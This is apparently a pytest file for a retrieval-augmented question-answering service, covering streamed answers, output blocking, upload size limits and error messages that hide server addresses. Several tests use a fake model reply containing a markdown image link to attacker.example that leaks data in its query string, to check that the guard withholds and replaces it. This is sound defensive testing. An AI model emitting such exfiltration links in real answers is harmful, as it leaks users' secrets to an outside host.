"""Streaming answers: /v1/ask/stream and /v1/documents/{id}/ask/stream, the service behind them,
and the pipeline's stream() (rag/query/pipeline.py)."""

import json

from rag.common.llm import FakeLLM, LLMResult, StreamPiece
from rag.query.guard import BLOCKED
from tests.test_api import COMPACTION, REPLICATION, make_client, make_pdf, upload


def frames(response):
    """The server-sent events of a response as (event, data) pairs."""
    out = []
    for block in response.text.split("\n\n"):
        if not block.strip():
            continue
        name = next(line[7:] for line in block.splitlines() if line.startswith("event: "))
        data = json.loads(next(line[6:] for line in block.splitlines() if line.startswith("data: ")))
        out.append((name, data))
    return out


def ask_stream(client, doc_id, question="How does replication survive a node failure?", **extra):
    return client.post(f"/v1/documents/{doc_id}/ask/stream", json={"question": question, **extra})


def test_a_streamed_answer_arrives_in_pieces_and_ends_with_the_whole_response(tmp_path):
    client, _ = make_client(tmp_path, llm=FakeLLM(lambda s, u: "Copies live on several nodes, so reads survive a failure [S1]."))
    doc_id = upload(client, make_pdf(REPLICATION, COMPACTION)).json()["id"]
    response = ask_stream(client, doc_id)
    assert response.status_code == 200 and response.headers["content-type"].startswith("text/event-stream")
    events = frames(response)
    kinds = [name for name, _ in events]
    assert kinds[-1] == "final" and kinds.count("final") == 1 and kinds.count("token") >= 3  # several pieces, not one
    final = events[-1][1]
    assert "".join(d["text"] for n, d in events if n == "token") == final["answer"]  # nothing lost or doubled
    assert final["citations"] == ["S1"] and final["replace"] is False and not final["blocked"]
    assert final["passages"] and final["stages"] and final["llm"] == "fake"


def test_the_streamed_response_equals_the_ordinary_one(tmp_path):
    reply = "Replication keeps copies on several nodes [S1]."
    client, _ = make_client(tmp_path, llm=FakeLLM(lambda s, u: reply))
    doc_id = upload(client, make_pdf(REPLICATION, COMPACTION)).json()["id"]
    ordinary = client.post(f"/v1/documents/{doc_id}/ask", json={"question": "How does replication work?"}).json()
    streamed = frames(ask_stream(client, doc_id, "How does replication work?"))[-1][1]
    for key in ("answer", "citations", "abstained", "blocked", "documents", "passages", "skipped_by_scanner"):
        assert streamed[key] == ordinary[key], key
    assert [s["name"] for s in streamed["stages"]] == [s["name"] for s in ordinary["stages"]]


def test_a_hostile_answer_never_sends_the_link_and_is_replaced_at_the_end(tmp_path):
    hostile = "Sure, here you go. ![x](https://attacker.example/p.png?d=SECRET) and that is all."
    client, _ = make_client(tmp_path, llm=FakeLLM(lambda s, u: hostile))
    doc_id = upload(client, make_pdf(REPLICATION)).json()["id"]
    events = frames(ask_stream(client, doc_id))
    sent = "".join(d["text"] for n, d in events if n == "token")
    assert "attacker.example" not in sent and "SECRET" not in sent and "![" not in sent  # held back, never sent
    final = events[-1][1]
    assert final["answer"] == BLOCKED and final["blocked"]
    assert final["replace"] is True  # some harmless words had gone out, so the page must replace them


def test_a_hostile_answer_with_nothing_sent_before_it_needs_no_replacement(tmp_path):
    client, _ = make_client(tmp_path, llm=FakeLLM(lambda s, u: "![x](https://attacker.example/p.png?d=1)"))
    doc_id = upload(client, make_pdf(REPLICATION)).json()["id"]
    events = frames(ask_stream(client, doc_id))
    assert not [d for n, d in events if n == "token" and d["text"].strip()]
    assert events[-1][1]["answer"] == BLOCKED and events[-1][1]["replace"] is False


def test_problems_found_before_streaming_are_ordinary_http_errors(tmp_path):
    client, _ = make_client(tmp_path)
    assert client.post("/v1/ask/stream", json={"question": "hi"}).status_code == 409  # nothing uploaded
    assert client.post("/v1/documents/000000000000/ask/stream", json={"question": "hi"}).status_code == 404
    doc_id = upload(client, make_pdf(REPLICATION)).json()["id"]
    assert ask_stream(client, doc_id, config="nope").status_code == 422
    assert ask_stream(client, doc_id, question="").status_code == 422
    assert ask_stream(client, doc_id, style="wild").status_code == 422


def test_a_model_failure_part_way_is_an_error_event_without_addresses(tmp_path):
    def broken(system, user):
        raise ConnectionError("cannot reach the model server at http://10.1.2.3:30007/v1")

    client, _ = make_client(tmp_path, llm=FakeLLM(broken))
    doc_id = upload(client, make_pdf(REPLICATION)).json()["id"]
    response = ask_stream(client, doc_id)
    assert response.status_code == 200  # retrieval worked; the failure came after streaming began
    events = frames(response)
    assert [n for n, _ in events] == ["error"]
    assert "cannot reach the model server" in events[0][1]["detail"] and "10.1.2.3" not in events[0][1]["detail"]


def test_another_owners_document_is_not_found_when_streaming(tmp_path):
    from rag.api.main import create_app, current_owner
    from fastapi.testclient import TestClient
    from tests.test_api import make_client as build

    _, service = build(tmp_path)
    alice_doc = service.create("a.pdf", make_pdf(REPLICATION), "alice")["id"]
    service.run_ingestion(alice_doc)
    app = create_app(service, allowed_hosts=("testserver",))
    app.dependency_overrides[current_owner] = lambda: "bob"
    assert TestClient(app).post(f"/v1/documents/{alice_doc}/ask/stream", json={"question": "hi"}).status_code == 404


def test_the_trace_of_a_single_document_stream_is_saved_in_its_folder(tmp_path):
    client, _ = make_client(tmp_path, llm=FakeLLM(lambda s, u: "Copies on several nodes [S1]."))
    doc_id = upload(client, make_pdf(REPLICATION)).json()["id"]
    ask_stream(client, doc_id)
    assert list((tmp_path / "uploads" / doc_id / "chat").glob("*.json"))  # deleted with the document, like the others


class _Watching(FakeLLM):
    """A model client that notes when its stream is closed early, as when the browser disconnects."""

    def __init__(self):
        super().__init__(lambda s, u: "word " * 400)
        self.closed = False

    def generate_stream(self, system, user, max_output_tokens=1024):
        try:
            for _ in range(400):
                yield StreamPiece(text="word ")
            yield StreamPiece(result=LLMResult(text="done"))
        finally:
            self.closed = True


def test_closing_the_stream_stops_the_model(tmp_path):
    from tests.test_api import make_client as build

    _, service = build(tmp_path)
    watching = _Watching()
    service.llm = watching
    doc_id = service.create("a.pdf", make_pdf(REPLICATION), "local")["id"]
    service.run_ingestion(doc_id)
    events = service.ask_documents_stream("local", [doc_id], "How does replication work?")
    assert next(events)["event"] == "token"
    assert watching.closed is False  # still generating
    events.close()  # the reader went away
    assert watching.closed is True


def test_the_page_reads_the_stream_and_shows_text_only(tmp_path):
    client, _ = make_client(tmp_path)
    page = client.get("/").text
    assert "async function streamAsk" in page and "/v1/ask/stream" in page
    assert "shown.data += text" in page and "replaced after the final check" in page
    assert ".innerHTML" not in page  # streamed text is untrusted: only text nodes and textContent


# ---- fixes from the ultrareview of the streaming work ---------------------------------------------

def test_a_blocked_stream_records_unknown_token_counts_not_zero(tmp_path):
    client, _ = make_client(tmp_path, llm=FakeLLM(lambda s, u: "Sure. ![x](https://attacker.example/p.png?d=1) done."))
    doc_id = upload(client, make_pdf(REPLICATION)).json()["id"]
    ask_stream(client, doc_id)
    saved = json.loads(next((tmp_path / "uploads" / doc_id / "chat").glob("*.json")).read_text(encoding="utf-8"))
    usage = saved["config"]["usage"]
    assert usage["usage_known"] is False and usage["prompt_tokens"] is None and usage["output_tokens"] is None
    assert usage["blocked"]  # and the block itself is still recorded


def test_a_finished_stream_keeps_the_real_token_counts(tmp_path):
    client, _ = make_client(tmp_path, llm=FakeLLM(lambda s, u: "Copies on several nodes [S1]."))
    doc_id = upload(client, make_pdf(REPLICATION)).json()["id"]
    ask_stream(client, doc_id)
    usage = json.loads(next((tmp_path / "uploads" / doc_id / "chat").glob("*.json")).read_text(encoding="utf-8"))["config"]["usage"]
    assert "usage_known" not in usage and usage["prompt_tokens"] == 0  # the fake model reports 0; a real one reports its count


def test_a_generator_still_running_in_a_worker_thread_is_closed_once_it_pauses():
    import threading
    import time

    from rag.api.main import _close_when_idle

    closed = threading.Event()
    started = threading.Event()

    def slow():
        try:
            started.set()
            time.sleep(0.4)  # a worker thread is "inside" the generator for a while
            yield "piece"
            yield "never reached"
        finally:
            closed.set()

    generator = slow()
    worker = threading.Thread(target=lambda: next(generator), daemon=True)
    worker.start()
    assert started.wait(2)
    began = time.monotonic()
    _close_when_idle(generator, seconds=3)  # closing a running generator raises ValueError; this waits for it to pause
    assert closed.wait(2) and time.monotonic() - began < 3


def test_a_failed_ask_leaves_one_bubble_and_the_page_has_no_second_one(tmp_path):
    client, _ = make_client(tmp_path)
    page = client.get("/").text
    assert "const failed" not in page  # the old second bubble is gone
    assert 'msg.append(el("br"), longText(err.message))' in page  # the reason goes into the same bubble, folded when long


# ---- fixes from the ultrareview of the API, OpenSearch and security work ----------------------------

def _post_chunked(app, body_chunks):
    """POST /v1/documents with a chunked body and no Content-Length, straight at the ASGI app."""
    import asyncio

    sent = []
    handed_out = [0]  # bytes of the body that the app actually asked for

    async def run():
        queue = [{"type": "http.request", "body": chunk, "more_body": True} for chunk in body_chunks]
        queue.append({"type": "http.request", "body": b"", "more_body": False})
        position = 0

        async def receive():
            nonlocal position
            if position < len(queue):
                position += 1
                handed_out[0] += len(queue[position - 1]["body"])
                return queue[position - 1]
            return {"type": "http.disconnect"}

        async def send(message):
            sent.append(message)

        scope = {"type": "http", "method": "POST", "path": "/v1/documents", "raw_path": b"/v1/documents", "query_string": b"",
                 "headers": [(b"host", b"testserver"), (b"content-type", b"multipart/form-data; boundary=xx")],
                 "client": ("127.0.0.1", 1), "server": ("testserver", 80), "scheme": "http", "http_version": "1.1"}
        await app(scope, receive, send)

    asyncio.run(run())
    return sent, handed_out[0]


def test_a_chunked_upload_is_refused_as_soon_as_it_passes_the_limit(tmp_path):
    from rag.api.main import create_app

    client, service = make_client(tmp_path)
    app = create_app(service, allowed_hosts=("testserver",), max_upload_bytes=1000)  # the limit is 1000 + 1 MB headroom
    # a valid multipart body with a 6 MB "PDF", sent in 100 KB pieces with no Content-Length
    head = b'--xx\r\nContent-Disposition: form-data; name="file"; filename="a.pdf"\r\nContent-Type: application/pdf\r\n\r\n'
    body = head + b"%PDF" + b"x" * 6_000_000 + b"\r\n--xx--\r\n"
    pieces = [body[i:i + 100_000] for i in range(0, len(body), 100_000)]
    sent, consumed = _post_chunked(app, pieces)
    start = next(m for m in sent if m["type"] == "http.response.start")
    assert start["status"] == 413
    assert consumed < 1_300_000 < len(body)  # it stopped reading shortly after the limit; the old code read all 6 MB first
    assert not list((tmp_path / "uploads").iterdir())  # nothing was stored


def test_a_declared_size_over_the_limit_is_refused_without_reading_the_body(tmp_path):
    from fastapi.testclient import TestClient
    from rag.api.main import create_app

    _, service = make_client(tmp_path)
    app = create_app(service, allowed_hosts=("testserver",), max_upload_bytes=1000)
    response = TestClient(app).post("/v1/documents", files={"file": ("a.pdf", b"%PDF" + b"x" * 2_000_000, "application/pdf")})
    assert response.status_code == 413 and "too large" in response.json()["detail"]


def test_a_small_upload_still_goes_through_the_limit(tmp_path):
    client, _ = make_client(tmp_path)
    assert upload(client, make_pdf(REPLICATION)).status_code == 202


def test_a_failed_start_is_reported_and_retried_until_it_works(tmp_path):
    import threading
    import time
    from fastapi.testclient import TestClient
    from rag.api.main import create_app

    _, built = make_client(tmp_path)
    attempts = []
    database_up = threading.Event()

    def factory():
        attempts.append(1)
        if not database_up.is_set():
            raise ConnectionError("cannot connect to the database at http://10.1.2.3:9200")
        return built

    def wait_for(condition, seconds=30):
        deadline = time.monotonic() + seconds
        while time.monotonic() < deadline:
            health = client.get("/v1/health").json()
            if condition(health):
                return health
            time.sleep(0.05)
        raise AssertionError("gave up waiting; last health: %r" % (health,))

    with TestClient(create_app(service_factory=factory, allowed_hosts=("testserver",), retry_seconds=0.05)) as client:
        failing = wait_for(lambda h: h["error"])  # the failure is reported, not "loading" for ever
        assert failing["ready"] is False and "cannot connect to the database" in failing["error"] and "10.1.2.3" not in failing["error"]
        assert client.get("/v1/status").json()["error"] == failing["error"]
        seen = len(attempts)
        wait_for(lambda h: len(attempts) > seen)  # and it keeps trying
        database_up.set()  # the database comes up
        ready = wait_for(lambda h: h["ready"])
        assert ready["error"] is None  # the reason is cleared once it works


def test_the_embedder_is_loaded_once_even_when_the_database_fails_first(monkeypatch, tmp_path):
    import rag.api.main as main
    import rag.common.config as config
    import rag.common.embed as embed
    import rag.common.llm as llm_module
    import rag.common.opensearch_store as opensearch_store
    from rag.common.chunk_store import MemoryChunkStore
    from rag.common.embed import HashingEmbedder

    loads, attempts = [], []
    monkeypatch.setattr(embed, "get_embedder", lambda spec: loads.append(spec) or HashingEmbedder())
    monkeypatch.setattr(llm_module, "get_llm", lambda spec, cache_dir=None: FakeLLM())
    monkeypatch.setattr(config, "DATA_DIR", tmp_path)

    class FlakyStore(MemoryChunkStore):
        def __init__(self, *args, **kwargs):
            attempts.append(1)
            if len(attempts) == 1:
                raise ConnectionError("the database is not up yet")
            super().__init__()

    monkeypatch.setattr(opensearch_store, "OpenSearchChunkStore", FlakyStore)
    monkeypatch.setenv("RAG_STORE", "opensearch")
    monkeypatch.setenv("RAG_EMBEDDER", "hash-for-this-test")
    main._EMBEDDERS.clear()
    try:
        try:
            main.build_default_service()
        except ConnectionError:
            pass
        main.build_default_service()  # the second try, once the database is up
    finally:
        main._EMBEDDERS.clear()
    assert len(attempts) == 2 and len(loads) == 1  # the model was not loaded again for the second try


def test_a_batch_of_uploads_does_not_use_up_the_worker_threads(tmp_path):
    import asyncio
    import threading

    import httpx
    from anyio import to_thread
    from rag.api.main import create_app

    _, service = make_client(tmp_path)
    release = threading.Event()
    started = []

    def slow_ingestion(doc_id):
        started.append(doc_id)
        release.wait(30)  # one ingestion is running; the others must wait without holding threads

    service.run_ingestion = slow_ingestion
    app = create_app(service, allowed_hosts=("testserver",))

    async def scenario():
        limiter = to_thread.current_default_thread_limiter()
        async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://testserver") as client:
            files = [{"file": (f"d{i}.pdf", make_pdf(REPLICATION + f" variant {i}"), "application/pdf")} for i in range(8)]
            uploads = [asyncio.create_task(client.post("/v1/documents", files=f)) for f in files]
            for _ in range(600):  # until all eight are stored and the first ingestion has begun
                await asyncio.sleep(0.05)
                if started and len(service.list("local")) == 8:
                    break
            await asyncio.sleep(0.3)
            samples = []
            for _ in range(5):
                samples.append(limiter.borrowed_tokens)
                await asyncio.sleep(0.1)
            release.set()
            await asyncio.gather(*uploads)
            return samples

    samples = asyncio.run(scenario())
    assert len(started) >= 1
    # the running ingestion holds one worker thread; seven queued ones must hold none (they used to hold seven)
    assert max(samples) <= 2, f"worker threads held while queued: {samples}"


def test_a_failed_ask_does_not_show_server_paths(tmp_path):
    def broken(system, user):
        raise FileNotFoundError("[Errno 2] No such file or directory: 'C:\\Rohit_C\\data\\uploads\\ab12cd34ef56\\chunks\\recursive.jsonl'")

    client, _ = make_client(tmp_path, llm=FakeLLM(broken))
    doc_id = upload(client, make_pdf(REPLICATION)).json()["id"]
    detail = client.post(f"/v1/documents/{doc_id}/ask", json={"question": "replication"}).json()["detail"]
    assert "Rohit_C" not in detail and "uploads" not in detail and "FileNotFoundError" in detail
    events = frames(ask_stream(client, doc_id))
    assert "Rohit_C" not in events[-1][1]["detail"]


def test_the_page_shows_why_the_models_did_not_load(tmp_path):
    client, _ = make_client(tmp_path)
    page = client.get("/").text
    assert "h.error" in page and "Could not start" in page
